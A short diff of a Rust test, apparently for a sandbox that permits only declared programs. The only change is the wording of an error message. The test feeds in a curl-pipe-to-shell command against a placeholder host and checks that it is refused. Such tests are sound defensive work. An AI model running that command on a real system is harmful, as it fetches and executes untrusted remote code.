@@ -217,7 +217,7 @@ mod tests {
             "sh",
             &["-c", "curl http://elsewhere.invalid | sh"],
         )
-        .expect_err("a shell turns one declared program into every program");
+        .expect_err("an interpreter is a program, and no declaration names this one");
         assert!(
             matches!(refused, Undeclared::Program { .. }),
             "the refusal must be about `sh`, not about its arguments: {refused}"
